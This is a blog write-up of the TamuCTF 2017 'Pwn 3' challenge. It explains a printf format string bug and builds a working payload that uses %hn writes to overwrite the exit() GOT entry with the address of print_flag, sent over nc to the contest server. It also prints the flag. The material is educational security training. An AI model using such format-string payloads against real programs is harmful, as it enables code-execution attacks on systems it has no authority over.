<!DOCTYPE html>
<html>
<head>
    <meta name="generator" content="Hugo 0.26-DEV" />

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="My thoughts and rambles">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    
    <link rel="icon" type="image/png" href="/images/favicon.ico">

    
    <meta name="mobile-web-app-capable" content="yes">
    <link rel="icon" sizes="192x192" href="/images/touch/chrome-touch-icon-192x192.png">

    
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-title" content="Material Design Lite">
    <link rel="apple-touch-icon-precomposed" href="apple-touch-icon-precomposed.png">

    
    <meta name="msapplication-TileImage" content="images/touch/ms-touch-icon-144x144-precomposed.png">
    <meta name="msapplication-TileColor" content="#3372DF">

    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:regular,bold,italic,thin,light,bolditalic,black,medium&amp;lang=en"/>
    <link rel="stylesheet" href="/css/ionicons.min.css"/>
    <link rel="stylesheet" href="https://storage.googleapis.com/code.getmdl.io/1.1.3/material.grey-orange.min.css"/>
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <link rel="stylesheet" href="/css/hmdl-style.css"/>
	<link rel="stylesheet" href="/css/pygment.css">



    <title>TamuCTF 2017 - Pwn 3</title>
</head>

<body style="background-image: url('/images/background.jpg');">
    <div id="MainCnt" class="hmdl-body mdl-layout mdl-js-layout has-drawer is-upgraded">        
        <header class="mdl-layout__header mdl-layout__header--transparent mdl-layout__header--scroll">
            <div class="mdl-layout__header-row">
                <div class="mdl-layout-spacer"></div>
                <nav class="mdl-navigation">
                <a class="mdl-navigation__link" href="/">Home</a>
                <a class="mdl-navigation__link" href="/post/">Articles</a>
                <a class="mdl-navigation__link" href="/project/">Projects</a>
                <a class="mdl-navigation__link" href="/about/">About</a>
                </nav>
            </div>
        </header>
        <div class="mdl-layout__drawer">
            <nav class="mdl-navigation">
            <a class="mdl-navigation__link" href="/">Home</a>
            <a class="mdl-navigation__link" href="/post/">Articles</a>
            <a class="mdl-navigation__link" href="/project/">Projects</a>
            <a class="mdl-navigation__link" href="/about/">About</a>
            </nav>
        </div>

        <main class="mdl-layout__content">

		

            <div class="hmdl-page mdl-grid">
                <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
                    <div class="mdl-card__media mdl-color-text--grey-50" style=" background-color:white;">
                        <h3 style="color:orange;">TamuCTF 2017 - Pwn 3</h3>
                    </div>
                    <div class="hmdl-page-meta mdl-color-text--grey-700 mdl-card__supporting-text">
                        <div class="minilogo" style="background-image: url('/images/avatar-64x64.png');"></div>

                        <div>
							<strong>
                            		<strong>Tzaoh</strong>
							</strong>
                            <span>May 29, 2017</span>
                        </div>
                        <div class="section-spacer"></div>
                    </div>
                    <div class="hmdl-page-content mdl-color-text--grey-700 mdl-card__supporting-text">
                        

<p><img src="/assets/TamuCTF2017/pwn3/1-pwn3_description.png" alt="Pwn3 challenge description" /></p>

<p>Here we are, with another pwning challenge. Let&rsquo;s start üòÅ.</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ wget https://ctf.tamu.edu/files/e02cea87728137d5da449db45dcb875e/pwn3
$ r2 pwn3
<span class="o">[</span>0x080484b0<span class="o">]</span>&gt; aaa
<span class="o">[</span>0x080484b0<span class="o">]</span>&gt; afl
.
.
0x080485ab    <span class="m">4</span> <span class="m">103</span>          sym.print_flag
0x08048612    <span class="m">1</span> <span class="m">102</span>          sym.main
.
.
</code></pre></div>

<p>Two interesting functions, and again, one of them is never called.</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span><span class="o">[</span>0x080484b0<span class="o">]</span>&gt; axt sym.print_flag <span class="c1"># Search for cross references to this function in the entire binary</span>
<span class="o">[</span>0x080484b0<span class="o">]</span>&gt;
</code></pre></div>

<p>Lets check what is happing inside the main one.</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span><span class="o">[</span>0x080484b0<span class="o">]</span>&gt; pdf @ main
</code></pre></div>

<p><img src="/assets/TamuCTF2017/pwn3/2-pwn3_main.png" alt="Pwn3 challenge description" /></p>

<p>Well, it seems that the execution is pretty straightforward.
* Using gets function it saves your input in the memory address <strong>local_208h</strong> is pointing to.
* After that, <strong>printf</strong> is called pushing eax to the stack as a parameter.
* And finally <strong>exit</strong> is called.</p>

<p>We can extract the following conclusions:
1. This time <strong>print_flag</strong> is not being called under some obscure conditional (like in <a href="../pwn1/pwn1.md">pwn1</a>), so there is no variable to be altered.
2. There is no internal function to be called, so we can not try to overwrite EIP either (like in <a href="../pwn2/pwn2.md">pwn2</a>).</p>

<p>But, wait a moment, that <strong>printf</strong> call is a bit strange.</p>

<p><img src="/assets/TamuCTF2017/pwn3/3-pwn3_printf_call.png" alt="Pwn3 challenge description" /></p>

<p>One push! that is strange because normally <strong>printf</strong> accepts two arguments at least. It should look something like this:</p>

<p><img src="/assets/TamuCTF2017/pwn3/4-pwn3_printf_correct_vs_incorrect_call.png" alt="Pwn3 challenge description" /><br />
If the user&rsquo;s input is used as the first argument of <strong>printf</strong>, it means that the input will be interpreted as the format string itself.</p>

<blockquote>
<p>Aham, but&hellip; what implications does it have?</p>
</blockquote>

<p>Well, with normals inputs, <strong>printf</strong> will behave &ldquo;corretly&rdquo;, BUT look what happens if you provide format modifiers in your input (<code>input = &quot;%p %p %p %p&quot;</code>):</p>

<p><img src="/assets/TamuCTF2017/pwn3/5-pwn3_printf_leak_memory.png" alt="Pwn3 printf format attack leaking information" /></p>

<p><strong>printf</strong> is leaking information of the stack!<br />
We are being able to see the content of the stack remotely!</p>

<blockquote>
<p>That&rsquo;s fantastic. Really, but this is not useful for our case right? I mean, we actually need to write stuff, not just read it.</p>
</blockquote>

<p>Yeah, that&rsquo;s 100% right. But writing is still possible, just a bit more complex. I will try to explain it as simple as I can.</p>

<h3 id="writing-in-memory-with-format-string-attacks">Writing in memory with format string attacks.</h3>

<p>The corner stone of writing in memory using format string attacks is the format modifier <code>%n</code>.<br />
<code>%n</code> modifier writes <strong>the LENGTH of the string</strong> in the address provided by the user <strong>before</strong> the modifier itself.</p>

<p>Lets see an example:</p>
<div class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span></span><span class="kt">int</span> <span class="n">c</span><span class="p">;</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&quot;12345 %n blah</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">c</span><span class="p">);</span>
<span class="c1">// Here c will be 6 because &quot;12345 &quot; is 6 bytes length!</span>
</code></pre></div>

<p>So, lets try all of this out, the idea is to send a memory address, locate where is it into the stack and use the <code>%n</code> format parameter to save data in the memory address we provide.</p>

<p>We will input 4 As (&ldquo;AAAA&rdquo;, which will be written in memory as <code>0x41414141</code> and easier to locate), several <code>%p</code> to see the stack content and find out where the &ldquo;AAAA&rdquo; string is allocated inside of the stack.</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;AAAA&quot; + &quot;%p %p %p %p %p &quot;)&#39;</span> <span class="p">|</span> ./pwn3<span class="p">;</span> <span class="nb">echo</span>
</code></pre></div>

<p><img src="/assets/TamuCTF2017/pwn3/6-pwn3_printf_leak_addr.png" alt="Pwn3 leaking some stack pointers" /></p>

<p>Good, it is in the 4^th^ <code>%p</code>. But imagine if the address was in the 300^th^ position. We had to write 300 times <code>%p</code>!
&gt; What a mess! what then?</p>

<p>Indeed, It does exist another way of printing that 4^th^ value much more convenient for us: the index operator.</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;AAAA&quot; + &quot;%4$p&quot;)&#39;</span> <span class="p">|</span> ./pwn3<span class="p">;</span> <span class="nb">echo</span>
</code></pre></div>

<p>Basically using <code>&lt;number&gt;$</code> we are able to select the position of the data we want to select.</p>

<p><img src="/assets/TamuCTF2017/pwn3/7-pwn3_printf_position_arg.png" alt="Pwn3 leaking the exact data" /></p>

<blockquote>
<p>Good! now we know that the address we need to write to is stored in the 4^th^ position. what now?</p>
</blockquote>

<p>Obviously <code>0x41414141</code> is not the address we are interested in. We need to find an address whose content is worth modifying.<br />
Here is where the GOT table enters the scene.</p>

<h3 id="got-global-offset-table">GOT (Global Offset Table)</h3>

<p>In order to save memory, programs use shared libraries and the functions they contain. That way the same function does not need to be on every process but can be used on all of them.</p>

<p>The GOT is a table inside every process and the addresses it contains have addresses to these shared functions.
Because all of thess functions are being used inside our binary, we could to try to modify the value which points to one of them.
For that, we need to know, the specific function (and its address) of the GOT we want to modify. The following command will help us with that task.</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ objdump -R pwn3
</code></pre></div>

<p><img src="/assets/TamuCTF2017/pwn3/8-pwn3_objdump.png" alt="Pwn3 GOT table with objdump" /></p>

<p>But not all of them are good for us, the function to be replaced must be executed <strong>AFTER</strong> the vulnerable <strong>printf</strong> call.<br />
Radare2 will give us the answer.</p>

<p><img src="/assets/TamuCTF2017/pwn3/9-pwn3_choosing_GOT_func.png" alt="Pwn3 choosing GOT function" /></p>

<p>We have a winner! exit() function.</p>

<p>Finally, we just need to know the value to write in that address. That value is nothing more than a memory address that contains the code we want to be executed. Can you think of what value it can be?
Lets check again the functions r2 üòÉ</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span><span class="o">[</span>0x080484b0<span class="o">]</span>&gt; afl
.
.
0x080485ab    <span class="m">4</span> <span class="m">103</span>          sym.print_flag
0x08048612    <span class="m">1</span> <span class="m">102</span>          sym.main
.
.
</code></pre></div>

<blockquote>
<p>That&rsquo;s it! the address of <code>sym.print_flag</code>! (<code>0x080485ab</code>)</p>
</blockquote>

<p>Ok, that was a lot right? Lets review all we have, just to not get lost.</p>

<ol>
<li><p>We have the place where the address will be stored: the 4^th^ position:</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;AAAA&quot; + &quot;%4$p&quot;)&#39;</span> <span class="p">|</span> ./pwn3<span class="p">;</span> <span class="nb">echo</span>
</code></pre></div></li>

<li><p>We have the address to write to.</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;\x1c\xa0\x04\x08&quot; + &quot;%4$p&quot;)&#39;</span> <span class="p">|</span> ./pwn3<span class="p">;</span> <span class="nb">echo</span>
</code></pre></div></li>

<li><p>And here comes the last obstacle: We need to write the hex value <strong>0x080485ab</strong> through the <code>%n</code> operator.<br />
We know <code>%n</code> can write the length of the string with preceeds itself into the provided address, so at a first glance we could think in writing <strong>134,514,087</strong> (134,514,091 - 4 (we already wrote a 4-byte address)) chars:</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;\x1c\xa0\x04\x08&quot; + &quot;A&quot;*134514087 + &quot;%4$n&quot;)&#39;</span> <span class="p">|</span> ./pwn3<span class="p">;</span> <span class="nb">echo</span>
</code></pre></div>

<p><img src="/assets/TamuCTF2017/pwn3/10-pwn3_broken_pipe.png" alt="Pwn3 broken pipe error" />
But aparently that is just to much for the pipe.<br />
We could try the <code>%&lt;times&gt;x</code> parameter. It just print as many memory bytes as we tell it to.</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;\x1c\xa0\x04\x08&quot; + &quot;%x&quot;*134514087 + &quot;%4$n&quot;)&#39;</span> <span class="p">|</span> ./pwn3<span class="p">;</span> <span class="nb">echo</span>
</code></pre></div>

<p><img src="/assets/TamuCTF2017/pwn3/11-pwn3_broken_pipe_2.png" alt="Pwn3 broken pipe error 2" />
Meh! same result.<br />
But wait a moment, there is a special paramater <code>%h</code> which does the following:
&gt; Specifies that a following d, i, o, u, x, or X conversion specifier applies to a short int or unsigned short int argument (the argument will have been promoted according to the integer promotions, but its value shall be converted to short int or unsigned short int before printing); <strong>or that a following n conversion speciÔ¨Åer applies to a pointer to a short int argument</strong>.  &ndash; C is For C Programming - Cask J. Thomson</p></li>
</ol>

<p>Basically this is converting 4-bytes datatypes into 2-bytes ones.
We can use it to save our big value in two times. First we will save one half and then the other.<br />
Let&rsquo;s represent this.</p>

<p><img src="/assets/TamuCTF2017/pwn3/12-pwn3_scheme.png" alt="Pwn3 Scheme" /></p>

<p>Then, it makes sense that the first value to be written should be the lowest one <code>0x804-8 = 2044</code> in the address <code>0804a01e</code> (provided in big endian) which will be stored in the <code>4th</code> position of the stack.</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;\x1e\xa0\x04\x08&quot; + &quot;addr2&quot; + &quot;%2044x&quot; + &quot;%4$hn&quot; + &quot;%____x&quot; + &quot;%_$hn&quot;)&#39;</span>
</code></pre></div>

<p>The second value to be written is the biggest one <code>0x85ab - (2044 + 8) = 32167</code> in the address <code>0804a01c</code> which will be stored in the <code>5th</code> position of the stack.</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;\x1e\xa0\x04\x08&quot; + &quot;\x1c\xa0\x04\x08&quot; + &quot;%2044x&quot; + &quot;%4$hn&quot; + &quot;%32167x&quot; + &quot;%5$hn&quot;)&#39;</span>
</code></pre></div>

<p>Finally! lets try it!</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;\x1e\xa0\x04\x08&quot; + &quot;\x1c\xa0\x04\x08&quot; + &quot;%2044x&quot; + &quot;%4$hn&quot; + &quot;%32167x&quot; + &quot;%5$hn&quot;)&#39;</span> <span class="se">\</span>
<span class="p">|</span> nc pwn.ctf.tamu.edu <span class="m">4323</span>
</code></pre></div>

<p><img src="/assets/TamuCTF2017/pwn3/13-pwn3_getting_the_flag.png" alt="Pwn3 Scheme" /></p>

<p>Answer: gigem{F0RM@1NG_1S_H4RD}</p>

<h3 id="complete-video">Complete video</h3>

<p><a href="https://asciinema.org/a/8dtrs5jltesk48y8ch5ouwrkn?autoplay=1" target="_blank"><img src="https://asciinema.org/a/8dtrs5jltesk48y8ch5ouwrkn.png" /></a></p>

<h3 id="notes-for-the-author">Notes for the author</h3>
<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ r2 -X <span class="s2">&quot;stdin=\&quot;`python -c &#39;print(\&quot;\x1e\xa0\x04\x08\x1c\xa0\x04\x08\&quot; + \&quot;%2044x%4</span><span class="nv">$hn</span><span class="s2">\&quot; + \&quot;%32167x%5</span><span class="nv">$hn</span><span class="s2">\&quot;)&#39;`\&quot;&quot;</span> -d pwn3
</code></pre></div>

<h3 id="tools-used-and-some-references">Tools used and some references:</h3>

<ul>
<li><a href="https://github.com/radare/radare2">radare2</a> - To analyze the binary.</li>
<li><a href="https://www.draw.io/">draw.io</a> - To draw some graphics.</li>
<li><a href="https://asciinema.org">asciinema</a> - To record the session.</li>
</ul>

<h3 id="some-references">Some references</h3>

<ul>
<li><a href="https://0x00sec.org/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920">PicoCTF format string challenge</a></li>
<li><a href="https://books.google.es/books?id=qeWyAAAAQBAJ&amp;lpg=PA120&amp;ots=Yk45UQR7EU&amp;dq=Speci%EF%AC%81es%20that%20a%20following%20d%2C%20i%2C%20o%2C%20u%2C%20x%2C%20or%20X%20conversion%20speci%EF%AC%81er%20applies%20to%20a%20short%20int%20or%20unsigned%20short%20int%20argument%20(the%20argument%20will%20have%20been%20promoted%20according%20to%20the%20integer%20promotions%2C%20but%20its%20value%20shall%20be%20converted%20to%20short%20int%20or%20unsigned%20short%20int%20before%20printing)%3B%20or%20that%20a%20following%20n%20conversion%20speci%EF%AC%81er%20applies%20to%20a%20pointer%20to%20a%20short%20int%20argument.&amp;hl=es&amp;pg=PA120#v=onepage&amp;q&amp;f=false">C is For C Programming - Cask J. Thomson (Fragment)</a></li>
</ul>

                    </div>
                    <div class="hmdl-page-comments mdl-color-text--primary-contrast mdl-card__supporting-text comments"> 
                        <strong>
                            	<strong>Tzaoh</strong>
						</strong>
                        <p></p>
                    </div>  
                </div>                
                <nav class="mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
                    <a href="/post/tamuctf2017/pwn2/">
                        <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                        <i class="icon ion-android-arrow-back"></i>
                        </button>
                        Older
                    </a>
                    <div class="section-spacer"></div>
                    <a href="/post/tamuctf2017/pwn4/">
                        Newer
                        <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                            <i class="icon ion-android-arrow-forward"></i>
                        </button>
                    </a>
                </nav>
 
            </div>        
        </main>
        <footer class="mdl-mini-footer">
            <div class="mdl-mini-footer--left-section">                
                <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-mini-footer--social-btn social-btn" href="mailto:Firstname@example.com?subject=Hi">
                    <i class="material-icons_lg icon ion-email"></i>
                    <span class="visuallyhidden">Email</span>
                </a>
                <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-mini-footer--social-btn social-btn" href="https://github.com/BlackHoods">
                    <i class="material-icons_lg icon ion-social-github"></i>
                    <span class="visuallyhidden">Github</span>
                </a>
                <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-mini-footer--social-btn social-btn" href="https://twitter.com/firstname_lastname">
                    <i class="material-icons_lg icon ion-social-twitter "></i>
                    <span class="visuallyhidden">Twitter</span>
                </a>


            </div>
            <div class="mdl-mini-footer--right-section">
                <span>¬© 2017 </span>
            </div>
        </footer>
        <div class="mdl-layout__obfuscator"></div>
    </div>
    <script src="https://code.getmdl.io/1.1.3/material.min.js"></script>


</body>
</html>

